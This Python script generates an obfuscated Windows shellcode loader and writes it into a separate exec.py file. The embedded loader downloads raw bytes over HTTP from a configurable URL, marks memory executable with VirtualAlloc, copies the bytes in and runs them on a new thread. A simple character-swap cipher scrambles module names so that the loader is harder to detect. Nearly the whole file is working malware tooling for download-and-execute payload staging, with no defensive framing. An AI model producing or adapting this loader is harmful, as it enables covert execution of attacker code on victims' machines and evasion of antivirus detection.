def custom_encode(data):
   
    char_mapping = {'a': 'd', 'd': 'a', 'k': 'L', 'L': 'k', ')': 'n','n': ')','P':'u','u':'P'}  
    
    encoded_data = ""
    for char in data:
        encoded_char = char_mapping.get(char, char)  
        encoded_data += encoded_char
    return encoded_data




script = f"""
static_url = "http://127.0.0.1/"
rs = rr.get(static_url)
if rs.status_code == 200:
    data = rs.content
    b_x = data
    print("Received shellcode data:", len(data), "bytes") 

kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
kk.windll.kernel32.CreateThread.argtypes = (
    kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
)

s = kk.windll.kernel32.VirtualAlloc
t = kk.windll.kernel32.CreateThread
u = kk.windll.kernel32.RtlMoveMemory
v = kk.windll.kernel32.WaitForSingleObject
spc = s(kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40))
bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
u(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
hndl = t(kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
            kk.pointer(kk.c_int(0)))
v(hndl, kk.c_uint32(0xffffffff))
"""

# Decode the script
encoded_script = custom_encode(script)

# Execute the decoded script
print(encoded_script )


with open('exec.py', 'r', encoding='utf-8') as file:
    file_content = file.read()

# Find the index of the start and end of the `en` variable content
start_index = file_content.find('en="""') + len('en="""')
end_index = file_content.find('"""', start_index)

# Replace the content of the `en` variable with the encoded script
updated_content = file_content[:start_index] + encoded_script + file_content[end_index:]

# Write the updated content back to the file
with open('exec.py', 'w', encoding='utf-8') as file:
    file.write(updated_content)